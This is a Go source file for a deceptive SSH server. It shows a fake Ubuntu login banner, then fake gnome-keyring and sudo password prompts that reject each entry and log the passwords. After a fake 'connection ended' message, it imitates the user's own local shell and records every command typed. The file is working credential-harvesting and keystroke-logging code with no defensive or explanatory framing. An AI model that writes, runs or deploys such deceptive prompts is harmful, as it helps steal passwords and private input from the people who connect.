package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var ubuntu1804LoginMessage = "\r\n Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.9.125-linuxkit x86_64) \r\n\r\n * Documentation:  https://help.ubuntu.com \r\n * Management: https://landscape.canonical.com \r\n * Support:        https://ubuntu.com/advantage \r\n\r\n This system has been minimized by removing packages and content that are not required on a system that users do not log into.  \r\n\r\nTo restore this content, you can run the 'unminimize' command.  \r\n\r\nThe programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  \r\n\r\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law."

func gnomeKeychainTrick(channel ssh.Channel) {
	io.WriteString(channel, "Unlock gnome-keyring\r\npassword: ")
	bio := bufio.NewReader(channel)
	for i := 0; i < 3; i++ {
		time.Sleep(1 * time.Second)
		io.WriteString(channel, "\r\n Password incorrect \r\npassword: ")
		keychainPassword, _ := bio.ReadString('\r')
		log.Printf("gnome-keyring password: %s", keychainPassword)
	}
}

func sudoPermissionsRequiredTrick(channel ssh.Channel) {
	io.WriteString(channel, "sudo required for ssh connection\r\npassword: ")
	bio := bufio.NewReader(channel)
	for i := 0; i < 3; i++ {
		time.Sleep(2 * time.Second)
		io.WriteString(channel, "\r\n Password incorrect \r\npassword: ")
		keychainPassword, _ := bio.ReadString('\r')
		log.Printf("sudo password: %s", keychainPassword)
	}
}

func signalsTrick(channel ssh.Channel) {
	scanner := bufio.NewScanner(channel)
	io.WriteString(channel, ubuntu1804LoginMessage)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string
	for {
		scanner.Scan()
		tok = scanner.Text()
		// early breaks sigint or eof
		if tok == "\x03" {
			break
		}
		if tok == "\x04" {
			break
		}
		// replace carriage returns with newlines
		if tok == "\r" {
			tok = "\n"
		}
		received.WriteString(tok)
		if len(received.String()) > 3 &&
			string(received.String()[len(received.String())-4:]) == "exit" {
			break
		}
	}

	fmt.Print(received.String())
	log.Println(received.String())
	io.WriteString(channel, "\r\nConnection to remote host ended \r\n/home/ $ ")
	received.Reset()
	// now we pretend to be the users local computer
	pretendToBeUsersComputer(channel)
}

func pretendToBeUsersComputer(channel ssh.Channel) {
	scanner := bufio.NewScanner(channel)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string

	for {
		scanner.Scan()
		tok = scanner.Text()
		// early breaks sigint or eof

		if tok == "\x03" {
			continue
		}

		if tok == "\x04" {
			continue
		}

		// echo the users keystrokes back to them
		io.WriteString(channel, tok)
		//
		received.WriteString(tok)
		if tok == "\r" {
			// get commands being executed
			log.Println(received.String())
			command := received.String()
			commandParts := strings.Fields(command)

			if len(commandParts) > 0 {
				if commandParts[0] == "sudo" {
					io.WriteString(channel, "\r\n sudo password:")
				} else {
					permissionDeniedStr := fmt.Sprintf("\r\npermission denied: %s", commandParts[0])
					io.WriteString(channel, permissionDeniedStr)
				}
			}

			io.WriteString(channel, "\r\n/home/ $ ")
		}

	}

}
